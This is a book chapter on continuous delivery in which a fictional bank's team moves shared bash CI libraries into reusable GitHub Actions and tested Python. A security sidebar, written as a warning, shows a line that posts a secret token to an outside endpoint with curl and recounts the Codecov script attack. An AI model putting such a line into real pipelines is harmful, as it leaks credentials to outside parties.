# 12 [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Scripts are code, too

### In this chapter

- designing highly cohesive, loosely coupled tasks to use in your pipelines
- writing robust, maintainable CD pipelines by employing the right language at the right time
- identifying tradeoffs between writing tasks using shell scripting languages (such as bash) and general-purpose languages (such as Python)
- keeping your CD pipelines healthy and maintainable by applying config as code to scripts, tasks, and pipelines

When you start[](/book/grokking-continuous-delivery/chapter-12/) to look closely at pipelines and tasks, you’ll usually find scripts at the core. Sometimes it feels like continuous delivery (CD) is just a lot of carefully orchestrated scripts—specifically, bash scripts.

In this chapter, I’m going to take the concept of config as code a bit further and make sure we’re applying it to the scripts we use to define our CD logic inside tasks and pipelines. This will often mean being willing to transition from a shell scripting language like bash to a more general-purpose language. Let’s take a look at how to treat our CD scripts like code too!

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Purrfect Bank

[](/book/grokking-continuous-delivery/chapter-12/)PurrfectBank is an online[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) bank targeting a specific niche market: banking for cats. Cat owners sign up their cats up for accounts, provide their cats with allowances, and let these cats spend their money by making online purchases with a Purrfect Bank credit card.

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-01.png)

Okay, it’s not really the cats making purchases; obviously cats can’t operate computers or use credit cards! But with Purrfect Bank, their owners can pretend.

The software teams at Purrfect Bank are divided into several organizations that operate mostly independently. Recently, the Payments Org has been having some trouble with its CD pipelines. The Payments Org is responsible for two services: the Transaction service and the Credit Card Integration service.

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-02.png)

The Transaction service is backed by a database and relies on the Credit Card Integration service to make calls out to the credit card providers that Purrfect Bank partners with to back their cat-friendly credit cards.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)CD problems

[](/book/grokking-continuous-delivery/chapter-12/)The Transaction service[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) and the Credit Card Integration service are each owned by a separate team, and lately team members have been complaining that the CD pipelines they use have been slowing them down, particularly the CI pipelines. Some people have even been suggesting getting rid of them altogether!

Lorenzo, the tech lead for the Payments Org at Purrfect Bank, takes these concerns seriously and is trying to find a way to fix the problems the teams are encountering—without throwing away their CI entirely.

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-03.png)

Lorenzo summarizes the concerns he’s hearing about the CD pipelines:

-  They are hard to debug.
-  They are hard to read.
-  Engineers are hesitant to make changes to them.

In general, it sounds to Lorenzo like these pipelines are both *hard to use* and *hard to maintain*.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Purrfect Bank CD overview

[](/book/grokking-continuous-delivery/chapter-12/)To understand why the Payments Org CD pipelines are causing so many problems, Lorenzo takes a look at them. There are two pipelines, one for the Transaction service and one for the Credit Card Integration service. The Transaction service pipeline is really just one giant task that runs a bash script:

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-04.png)

The credit card service pipeline is better, comprising multiple tasks:

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-05.png)

Though they are structured differently, both of these pipelines rely on the same common library of bash scripts.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Payment Org’s bash libraries

[](/book/grokking-continuous-delivery/chapter-12/)The teams in the Payment[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) Org at Purrfect Bank divide their code into the following repos:

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-06.png)

The CI script repo contains a number of bash scripts, including these:

-  linting.sh
-  unit_tests.sh
-  e2e_tests.sh

The other two repos contain copies of the CD script repo (which are regularly updated when the CD script repo changes), and their tasks import these libraries. For example, the beginning of the linting.sh bash lib looks like this:

```
#!/usr/bin/env bash
set -xe
function lint() {
        local command=$1
        local params=$2
        shift 2
        for file in $@; do
                echo "${command} ${params} ${file}"
                ${command} ${params} ${file}
        done
}
function python_lint() {
        lint "python3" "-m pylint" $@ #1
}
```

##### Does having a “bash library” even make sense?

Good question! Certain attributes of bash make it not well suited to creating reusable libraries—I’ll talk about these in detail in a few pages. In the meantime, suffice it to say that this might not be the best choice, but if you do want to share bash scripts between tasks and between projects, you might find yourself taking an approach like this. Should you? Probably not—I’ll get to that soon!

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Transaction service pipeline

[](/book/grokking-continuous-delivery/chapter-12/)Lorenzo decides[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) to focus on the Transaction service first. The entire pipeline is one task, and one big script that backs it. Lorenzo has a feeling this is the main source of the pain that the transaction team is feeling, but he wants to confirm his suspicions.

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-07.png)

Listening to Chelsea’s description, Lorenzo felt this confirmed his theory: the *signal* that Chelsea got back from the pipeline when it failed didn’t have that much information for her—until she investigated further—for example, by looking through the execution logs. With the pipeline being made up of just one giant task, the only signal that Chelsea was getting was either *pipeline failed* or *pipeline passed*, and it was left up to her to dig into the details to understand what that meant.

See chapter 5 for more on *signals* and *noise*, and chapter 7 for all the places in a change’s life cycle where signals are needed to make sure bugs are caught.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Evolving from one big script

[](/book/grokking-continuous-delivery/chapter-12/)Lorenzo sets a goal[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) for the Transaction service pipeline: to go from the current state of having only one signal (either *pipeline failed* or *pipeline passed*) to a state where the pipeline can produce multiple discrete signals. In a situation like Chelsea’s, this will save her a lot of investigation time by allowing her to know right away what is going wrong so she can focus her efforts. In this investigation, Lorenzo has stumbled on a good rule of thumb for deciding what the boundaries of a task should be:

**Use a separate task for each discrete signal you want your pipeline to produce**.

Lorenzo looks a the current script and identifies the individual signals that would be useful for the team to get from it:

```
#!/usr/bin/env bash

set -xe

source $(dirname ${BASH_SOURCE})/linting.sh    #1
source $(dirname ${BASH_SOURCE})/e2e_tests.sh  #1
source $(dirname ${BASH_SOURCE})/unit_tests.sh #1

config_file_lint $@                            #2
markdown_lint $@                               #2
python_lint $@                                 #2

run_unit_tests                                 #2
measure_unit_test_coverage                     #3

build_image "purrfect/transaction" "image/Dockerfile"
setup_e2e_sut
deploy_to_e2e_sut "purrfect/transaction"
run_e2e_tests                                  #3
```

##### Some of these things should be happening in parallel too, right?

That’s a good point—not only is this all being done in one big task, but each function call is blocked on the one before it, though sometimes there is no reason for it. In the updated pipeline, Lorenzo will update some of this code to run in parallel; also see chapter 13 for more on this topic.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Principles of well-designed tasks

[](/book/grokking-continuous-delivery/chapter-12/)Lorenzo’s goal[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) is to go from one signal (either *pipeline failed* or *pipeline passed*) to individual tasks for each signal that it would be useful for the pipeline to produce, following the guideline:

**Use a separate task for each discrete signal you want your pipeline to produce**.

In addition to this guideline, other principles can be followed to design tasks well. A useful way to think about tasks is to define them as you design functions. Well-designed tasks have the following characteristics:

-  Are *highly cohesive* (do one thing well)
-  Are *loosely coupled* (are reusable and can be composed with other tasks)
-  Have *clearly defined**, intentional interfaces* (inputs and outputs)
-  *Do just enough* (not too little, but not too much)

As with creating clean code, the way that one engineer interprets the preceding principles may differ from the approach of another engineer, but the more experience you get with task design, the better you get at it. And really the most important thing is to keep these principles in mind and try to apply them, not to aim for an ultimate goal of creating the perfect task. At the same time, here are some signs that your task might be doing too much:

-  You find yourself duplicating parts of your task in other tasks (for example, copying logic to upload results into multiple tasks).
-  Your task contains orchestration logic (for example, looping over an input to do the same thing multiple times, or polling an activity to complete before kicking off another one).

These responsibilities are better suited to a pipeline; the goal is that tasks define highly cohesive, loosely coupled logic, and pipelines orchestrate combinations of that logic.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Breaking up the giant task

[](/book/grokking-continuous-delivery/chapter-12/)Looking at the[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) large task that made up the entirety of the Transaction service pipeline, Lorenzo identified nine separate signals that he’d like to break into separate tasks (which can be combined and orchestrated by the pipeline itself):

1.  `config_file_lint`
1.  `markdown_lint`
1.  `python_lint`
1.  `run_unit_tests`
1.  `measure_unit_test_coverage`
1.  `build_image`
1.  `setup_e2e_sut`
1.  `deploy_to_e2e_sut`
1.  `run_e2e_tests`

After working with the transaction team to break this task into individual tasks, Lorenzo has a task for each of the preceding function calls:

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-09.png)

To minimize bugs introduced while breaking up these tasks, Lorenzo keeps them as close as possible to the original. As much as possible, he doesn’t (yet) tackle trying to make changes to the underlying bash libs, so the tasks he creates look very similar to the previous large bash script; they just do less. For example, this is what the Python linting task looks like:

```
#!/usr/bin/env bash 
set -xe 

source $(dirname ${BASH_SOURCE})/linting.sh    #1 
source $(dirname ${BASH_SOURCE})/e2e_tests.sh  #1 
source $(dirname ${BASH_SOURCE})/unit_tests.sh #1 

python_lint $@
```

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Updated Transaction service pipeline

[](/book/grokking-continuous-delivery/chapter-12/)These tasks look familiar[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) to Lorenzo, and he realizes that this is the same set of tasks used by the Credit Card Integration service pipeline. With a bit of work between himself and the two teams, he’s able to update the two pipelines to be pretty much identical: they have same shape and use the mostly the same tasks. Now both pipelines look like roughly this:

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-10.png)

Now instead of the Transaction service team relying on one giant task, both of the teams in the Payments Org are in the same position: their CD pipelines produce multiple signals, one per task, with each task calling into the bash libraries they share via the CD script repo.

#####  Takeaway

Well-designed tasks have a lot in common with well-designed functions. They are highly cohesive, loosely coupled, have well-defined interfaces, and do just the right amount. Taking an incremental approach when evolving from tasks with too many responsibilities to well-designed tasks makes the transition easier.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Debugging bash libraries

[](/book/grokking-continuous-delivery/chapter-12/)The two teams[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) in the Payments Org now use basically the same pipeline, but that doesn’t mean Lorenzo is out of the woods yet. The credit card integration team, which had already been using the more well-factored pipeline, still runs into a lot of problems with its CD pipeline on a regular basis.

Recently, Lulu, an engineer on the team, ran into a frustrating bug with the CD pipeline while she was trying to open a PR. She was making a simple bug fix and was surprised when the task `Set up SUT Environment` failed on her PR with a permission error.

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-11.png)

To investigate the problem, Lulu looks at the script that the `Set` `up` `SUT` `Environment` task uses:

```
#!/usr/bin/env bash 

set -xe 

SERVICE_ACCOUNT='cc-e2e-service-account' 
source $(dirname ${BASH_SOURCE})/e2e_tests.sh 

setup_e2e_sut
```

She definitely hasn’t changed anything here, and the logic seems reasonable to her: set the environment variable that controls the service account used by the `setup_e2e_sut` function, and then import and call the function. So she opens the bash library `setup_e2e_sut` and sees this:

```
unset SERVICE_ACCOUNT  #1 

function setup_e2e_sut() {...
```

It turns out that a line has been added to `e2e_tests.sh` that creates a side effect of loading the bash library/script: it intentionally unsets the environment variable that controls the service account used by the end-to-end tests.

##### What’s a service account?

Don’t worry about the details too much, but at a high level, many applications (and particularly cloud platforms) allow users to define *service accounts* that can be given specific permissions. In this example, end-to-end tests need to provide a service account in order to set up the infrastructure required for their tests to run.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Investigating the bash library bug

[](/book/grokking-continuous-delivery/chapter-12/)From Lulu’s point[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) of view, introducing this side effect to the bash library `e2e_tests.sh` is a bug. She escalates this to Lorenzo, who has been asking team members to come to him with examples of CD pipeline problems they are experiencing. Lorenzo starts investigating what happened by looking at the commit message associated with the change, made by Ajay from the Transaction service team:

| **Ajay** Ensure end-to-end tests start with a clean slate When I tried to update our SUT environment task to set up multiple environments, I realized that it was easy to accidentally use the environment variables already set. This commit updates the library to erase all required environment variables and start with a clean slate. |
| --- |

Looking at the Transaction service pipeline, Lorenzo realizes that the `Set` `up` `SUT environment` task the team is using is subtly different from the one being used by the credit card integration team:

```
#!/usr/bin/env bash 

set -xe 

source $(dirname ${BASH_SOURCE})/e2e_tests.sh 
SERVICE_ACCOUNT='cc-e2e-service-account' #1 

setup_e2e_sut
```

Another way to minimize this kind of problem is for both teams to share their tasks exactly, so there are no differences. Lorenzo is working toward this goal but isn’t here yet.

##### Why not pass the service account as a parameter instead?

It’s a fair point: if `setup_e2e_sut` took the service account as a parameter instead of expecting an environment variable to be set, this problem would have been avoided. Our example is relying on environment variables. One of the downsides of bash scripts is that they commonly depend on environment variables like this, especially if multiple functions need to use the same value. In addition, bash scripts will often call programs that themselves expect these environment variables to be set.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Why was the bug introduced?

[](/book/grokking-continuous-delivery/chapter-12/)Lorenzo can see[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) why Ajay would think this change was reasonable if he was looking only at the way the Transaction service is using the `e2e_tests.sh` library, but he wants to understand a bit more about why no one realized the broader implications of the change. Lorenzo sees that the PR with Ajay’s commit was reviewed by Chelsea, so he meets with Ajay and Chelsea to talk through what went wrong.

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-13.png)

Lorenzo thanked Ajay and Chelsea for being candid about what happened. He could see that they did their best to try to make sure the change wouldn’t cause any problems, but they ran into trouble for the following reasons:

-  While updating the code, it was hard to track down usages—and there were no tests to demonstrate any expectations around it.
-  And since there were no tests, and no clear way to add them, Ajay wasn’t able to include any kind of automated verification of the changes.
-  While reviewing the code, it was very difficult to understand the implications of the changes. There were no tests to look at, and the reviewer faced the same problems as the author as far as being able to investigate and figure out what other tasks and pipelines this change might impact.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)What is bash for?

[](/book/grokking-continuous-delivery/chapter-12/)The kinds of problems[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) the team is running into, especially the lack of tests, make Lorenzo start wondering if bash is really the best language to be using in the CD scripts repo. Although he’s seen bash used frequently in CD pipelines, he realizes he’s never really thought about what it is and whether it’s the best choice.

To think that through, it helps to understand what bash actually is, what it works well for and what it doesn’t. *Bash*, an acronym for *Bourne Again Shell*, was created as a replacement for the *Bourne Shell*[](/book/grokking-continuous-delivery/chapter-12/) (also called *sh*). Both of these are kinds of *shells*[](/book/grokking-continuous-delivery/chapter-12/)—text interfaces into operating systems.

So while engineers often think about bash as a scripting language, it’s more than that: it’s a language used to power an interface into an operating system. Authors of bash scripts can use the following:

-  *Bash language constructs* (such as `if` statements, `for` loops, and functions you define in your scripts)
-  *Bash built-in command*s (functions that are made available as part of the shell—for example, `echo`)
-  *Programs* that bash knows how to find (executable programs available in directories that bash is configured to look in via the `PATH` environment variable)

Bash and other shell scripting languages that you might encounter (for example, *sh* and *PowerShell*) are made for orchestrating operating system commands. They really shine when all you want to do is run a command or program, or especially when you want to run multiple commands designed to follow the Unix philosophy, making it easy to get output from one command and feed it into another. This is sometimes generalized into saying that bash is good for “piping stuff around” (piping the output of one command into another).

##### What is the Unix philosophy?

I won’t get into the details, but it’s well worth looking up and reading about. In short, it’s a set of principles for defining modular programs that work really well together and that was used to develop Unix.

CD tasks are often doing nothing more than calling a program or command, and reporting back the results (e.g., calling Python to run unit tests), so it makes sense why shell scripting languages show up in CD tasks and pipelines so often.

##### So if I use sh instead of bash, have I avoided the problems?

The points made in this chapter about bash apply equally to all shell scripting languages you might encounter (for example, if you work with Windows a lot, you might be dealing with PowerShell), and all shell scripting languages should be treated with the same care.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)When is bash less good?

[](/book/grokking-continuous-delivery/chapter-12/)Bash has its strengths, and since it particularly shines in the domain of what CD tasks are usually doing (invoking programs and commands), it’s a great starting place. However, when CD tasks start to grow and become more complicated, bash starts to be less appealing. Signs that bash might not be the best tool for the job are as follows:

-  Scripts that are more than a few lines long
-  Scripts that include multiple conditions and loops
-  Logic complex enough that it feels worth having tests for it
-  Logic that you want to share between scripts, e.g., via libraries

The lack of test support and good support for defining reusable functions are the main places where bash starts to fall apart when logic grows in complexity. Even simple bash functions are extremely limited in what they can support (for example, you cannot return data from them, only exit codes, and have to instead rely on environment variables or stream processing to get values from them). No good mechanisms exist for versioning and distributing libraries of these functions.

Instead of trying to make bash do something it isn’t good at, if you see any or all of the preceding issues appearing in your CD scripts, seriously consider reaching for a general-purpose programming language (e.g., Python) instead.

General-purpose programming languages shine where bash falls down. Specifically, they are designed to support defining well-scoped, reusable functions and libraries. Those functions and libraries can be supported with tests, and with versioned releases just like any other software.

Best of all, any program you write in these general-purpose languages can be called from bash. Therefore, it’s not really a matter of using bash *or* a general-purpose language; it’s a matter of using both and understanding when it makes sense to use one or the other. See [http://mywiki.wooledge.org/BashWeaknesses](http://mywiki.wooledge.org/BashWeaknesses) for more bash weaknesses.

##### The ease of writing code versus the cost of maintaining it

One reason you may encounter so much bash in CD pipelines is an approach that is prevalent in software in general, but dangerous: to overoptimize for the ease of writing code and not the cost of maintenance. Bash scripts can be easy to write (especially if you know bash well), and when you need to update them, adding a few lines here and there can be easy. But the cost of maintaining those easy-to-write lines can be huge, compared to the one-time cost of moving to a language with better support for the logic you need.

You wouldn’t consider writing your production applications in bash, so why would you write the code you use to support development purely in bash? Code is code!

#####  Security and scripts

[](/book/grokking-continuous-delivery/chapter-12/)Using scripts[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) in your CD pipelines can be dangerous. As you saw in the previous pages, bash in particular provides an interface into the underlying operating system. This often means that bash scripts have broad access to the contents of that operating system and can be an attack vector for malicious actors.

The prevalence of bash scripts in CD systems means that it is very common in CD tasks and pipelines to define environment variables for important information required for task execution, including sensitive data, like authentication information. For example, imagine that a bash script is provided with an environment variable that contains a sensitive token:

```
MY_SECRET_TOKEN=qwerty012345qwerty012345qwerty012345
```

The bash script is completely free to do whatever it wants with that token—for example, writing it to an external endpoint:

```
curl -d $MY_SECRET_TOKEN https://some-endpoint
```

CD systems like GitHub Actions provide additional mechanisms for dealing with secrets; for example, a common pattern is to have GitHub Actions store a secret and then in your workflow, you can bind that secret to an environment variable. The equivalent of the preceding code could be the following:

```
- name: Use my secret token
 env:
   MY_SECRET_TOKEN: ${{ secrets.MY_SECRET_TOKEN }}
 run: |
   curl -d $MY_SECRET_TOKEN https://some-endpoint
```

The danger is that if a malicious actor is able to change your scripts, they have complete freedom to access these environment variables (and anything else available on the operating system) and do whatever they want with them.

One famous example of this is the April 2021 attack on the code coverage tool, Codecov. An actor was able to get access to and modify the bash script that Codecov provided for sending code coverage reports. This bash script was imported and used across all CD pipelines that used Codecov for coverage reporting. All the actor had to do was add one line of bash that uploaded all of the environment variables available in the context of the script to a remote endpoint. And since it is so common to provide sensitive information to scripts via environment variables, this potentially provided the actor with access to many systems, and users of Codecov had to scramble to re-roll any credentials that might have been exposed. (For more information on the attack, see the Codecov website at https://about.codecov.io/security-update/.)

This gives us a good reason to be careful about the scripts we write in our CD pipelines. Think about who can modify the script and what they might have access to if they do.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Shell scripting vs. general-purpose languages[](/book/grokking-continuous-delivery/chapter-12/)

| **Featur**. | **Shell scripting language**. | **General-purpose language**. |
| --- | --- | --- |
| **Basic flow[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) control (e.g., if statements, for loops, functions**. | Yes. They support flow-control features; functions in bash are not as reusable as in they are in general-purpose languages. | Yes |
| **Multiple data type**. | Often limited. In bash theoretically supports strings, arrays, and integers, but these are all stored as strings. | Yes |
| **Invoking other program**. | Yes. Easily, with support for chaining input and output between programs. | Yes, but not as easily. This usually involves calling out to a library that will spawn the new program’s process and handle communication with it. |
| **Test**. | No. Not well supported as part of the language itself. | Yes |
| **Debuggin**. | Often limited. Usually tools supporting debugging scripts are limited. | Yes. Supporting tools are often created for general-purpose language debugging, e.g., IDE support for setting breakpoints. |
| **Versioned libraries and package**. | No | Yes |
| **IDE syntax suppor**. | Yes | Yes |
| **Mitigating malicious modification (see previous page**. | No. It takes ony one line of bash to exfiltrate a wealth of data. | No. General-purpose languages can also be used to exfiltrate sensitive data. However, chances are higher that good practices (e.g., review, well-factored code) will be followed, potentially decreasing the risk. |

#####  Vocab time

*General-purpose programming languages*[](/book/grokking-continuous-delivery/chapter-12/) were created to be used across various use cases and domains, as opposed to languages created for specific narrowly designed purposes. In this chapter, I am contrasting them with shell scripting languages (designed to be invoked from operating system shells). Examples of general-purpose languages are Python, Go, Ruby, and C.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Shell script to general-purpose language

[](/book/grokking-continuous-delivery/chapter-12/)Lorenzo decides that trying to maintain bash libraries in the CD scripts repo is causing more pain than it’s worth, and creates a plan to migrate these libraries away from bash. He identifies three options for how to do this for their team, choosing Python as the language for more complex logic going forward:

-  Convert the bash functions to a standalone tool written in Python.
-  Convert the bash functions to Python libraries that can be called from standalone tools or from Python scripts.
-  Convert the bash functions to reusable tasks.

##### How do you define and distribute reusable tasks?

The answer depends on the CD system you’re using. If you’re using GitHub Actions, this is done by defining your own custom Actions. See appendix A for what this feature looks like in other CD systems.

Following this plan, the CD scripts repo will come to contain reusable versioned tools, libraries, and tasks, instead of an unversioned pile of bash. Lorenzo examines each bash file in the repo and the functions it contains, to decide which option is best:

-  linting.sh: `python_lint`
-  linting.sh: `markdown_lint`
-  linting.sh: `config_file_lint`
-  unit_tests.sh: `run_unit_tests`
-  unit_tests.sh: `measure_unit_test_coverage`
-  e2e_tests.sh: `build_image`
-  e2e_tests.sh: `setup_e2e_sut`
-  e2e_tests.sh: `deploy_to_e2e_sut`
-  e2e_tests.sh: `run_e2e_tests`

In the cases of linting.sh and unit_tests.sh, Lorenzo finds that the bash function contents are really just calling out to programs and reporting the results, so keeping them in bash makes sense. He suggests defining tasks for these in the CD scripts repo and calling them exactly as is from each service’s CD pipeline.

e2e_tests.sh is where the logic starts to get complicated (as Lulu, Ajay, and Chelsea learned firsthand), especially `setup_e2e_sut`, so Lorenzo suggests that this function is converted into a versioned Python library, and that the teams create and maintain a tool for end-to-end test setup that uses it.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Migration plan

[](/book/grokking-continuous-delivery/chapter-12/)Lorenzo comes[](/book/grokking-continuous-delivery/chapter-12/) up with a plan to migrate away from the bash libraries to reusable tasks instead:

1.  Convert the functions in linting.sh and unit_tests.sh to reusable tasks. They’ll still use bash, but instead of trying to share bash as libraries, both the Transaction service and the Credit Card Integration service pipelines can reference the tasks definitions as is (no need to share any bash or to copy and paste definitions around).
1.  To prepare to convert functions from bash to Python, create an initial empty Python library and automation to create versioned releases (see chapter 9 on building). Also do this for any new tools you anticipate creating.
1. For each function that is going to be converted from bash to Python:

1. Decide what package to put the function in, and either create a new package or add it to an existing package.
1. Rewrite the function in Python.
1. Add tests for the function.

As the functions are incrementally updated, Lorenzo also updates the pipelines that were using them to use the new versions, either by updating the pipeline to use the new tasks, by updating the existing tasks to use Python scripts (and import the new libraries), or by updating the existing tasks to use the new Python-based end-to-end tool instead.

##### Should I store all of my CD scripts in one repo?

Treat these scripts like any other code: make the same decision you’d make if this was your production business logic code. Starting with one repo can make things easy, but be careful that it doesn’t become a grab bag of random functionality. Using separate repos also can make it easier to version each library and task separately; otherwise, version tagging in the repo can get a bit complicated. For example, a `v0.1.0` version tag would apply to all code in the repo, which may consist of multiple tasks, libraries, and tools.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)From bash library to task with bash

[](/book/grokking-continuous-delivery/chapter-12/)One of the first[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) bash functions that Lorenzo takes on is the function that does Python linting, which was called from the Transaction service pipeline like this:

```
#!/usr/bin/env bash
set -xe

source $(dirname ${BASH_SOURCE})/linting.sh
source $(dirname ${BASH_SOURCE})/e2e_tests.sh
source $(dirname ${BASH_SOURCE})/unit_tests.sh

python_lint $@
```

To understand all the code required for this to work, Lorenzo looks into the linting.sh, e2e_tests.sh, and unit_tests.sh files that are being sourced by this script, and discovers that only code from linting.sh is relevant here—specifically, the two functions `lint()` and `python_lint()`:

```
function lint() {
 local command=$1
 local params=$2
 shift 2
 for file in $@; do   #1
  ${command} ${params} ${file}
 done
}
function python_lint() {
 lint "python" "-m pylint" $@
}
```

Lorenzo’s goal is to turn the linting functionality into a small, self-contained bash script that can be used inside the task without needing to source any libraries. Taking it step by step, here’s what would it look like if the `python_lint()` function contained the logic in the `lint()` function:

```
function python_lint() {
 for file in $@; do
  python -m pylint ${file}  #1
 done
}
```

So in total, to encapsulate the entirety of the linting functionality in one self contained bash script, all that is needed is this:

```
#!/usr/bin/env bash
set -xe
for file in $(find ${{ inputs.dir }} -name "*.py"); do
 python -m pylint $file
done      #1
```

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Reusable bash inside a task

[](/book/grokking-continuous-delivery/chapter-12/)Lorenzo has refactored[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) the Python linting logic into one self-contained bash script:

```
#!/usr/bin/env bash
set -xe
for file in $(find ${{ inputs.dir }} -name "*.py"); do
python -m pylint $file
done
```

But he doesn’t want to share this bash script directly across the Transaction service and credit card CD pipelines. He wants to put it into a task that can be written once and referenced by the pipelines.

Since Purrfect Bank is using GitHub Actions for its CD automation, it creates a GitHub Action in the CD scripts repo to act as that reusable task. The GitHub Action looks like this:

```
dir:description: "The directory containing files to lint"default: "."steps:—shell bashfor file in $(find ${{ inputs.dir }} -name "*.py"); do
python -m pylint $file
done

#1 Taking the directory as an argument allows this Action to be used regardless of where the files are located.
#2 This syntax tells GitHub Actions that the contents of the “run” section should be executed in a bash shell.
#3 Lorenzo needs to install Pylint so it is available.
#4 Lorenzo’s script is now embedded directly in the GitHub Action.
```

Now both pipelines are able to reference the GitHub Action directly in the CD scripts repo, allowing them to reuse the task like this:

```
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
    — uses: actions/checkout@v2
    — name: Python lint
      uses: purrfectbank/cd/.github/actions/python-lint@v0.1.0 #1
#1 By defining Python linting as a GitHub Action, it is now a reusable task that can be released and versioned.
```

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)From bash to Python

[](/book/grokking-continuous-delivery/chapter-12/)Lorenzo next[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) turns his attention to e2e_tests.sh. The functions `build_image`, `run_e2e_tests`, and `deploy_to_e2e_sut` are simple enough that he creates reusable GitHub Actions for each of them. But the last bash function (`setup_e2e_sut`) is complex, so he decides to create a versioned, tested library for it in Python, and a Python tool that can be used to run it.

First he creates an empty Python library in the CD repo called end-to-end. He also sets up automation to create versioned releases, pushed to the company’s internal artifact registry (this is the same automation the engineers apply to any of the libraries they use in their production code).

Within that library, he creates a package called setup, and he creates a command-line tool called `purrfect-e2e-setup` that calls that library. Best of all, he’s able to add tests for every function in the setup package, and for the tool as well! After all of these updates, the structure of the CD scripts repo looks like this:

```
.github/ 
  actions/ 
    config-lint.yaml 
    markdown-lint.yaml        #1 
    python-lint.yaml 
    unit-test.yaml 
    coverage.yaml 
    build-image.yaml 
    run-e2e-tests.yaml 
    deploy-to-e2e.yaml 
e2e/ 
  setup/                      #2 
       test/... 
     purffect-e2e-setup.py    #2 
     setup.py 
     requirements.txt 
     README.md 
   README.md
```

#####  Takeaway

Shell scripts are perfect for “piping together” individual programs, but once logic starts to grow, switch to another language and/or sharing mechanism.

## [](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/)Tasks as code

[](/book/grokking-continuous-delivery/chapter-12/)After Lorenzo[](/book/grokking-continuous-delivery/chapter-12/)[](/book/grokking-continuous-delivery/chapter-12/) is done, the tasks being used by the two teams in the Payments Org look like this:

![](https://drek4537l1klr.cloudfront.net/wilson3/Figures/12-14.png)

The pipelines defined by the two services are virtually identical, and they are now both backed by libraries and scripts that are treated as code: stored in version control, tested, reviewed, and versioned.

Lorenzo has been able to solve the problems the teams were experiencing with their pipelines, and they are no longer talking about doing away with their CI:

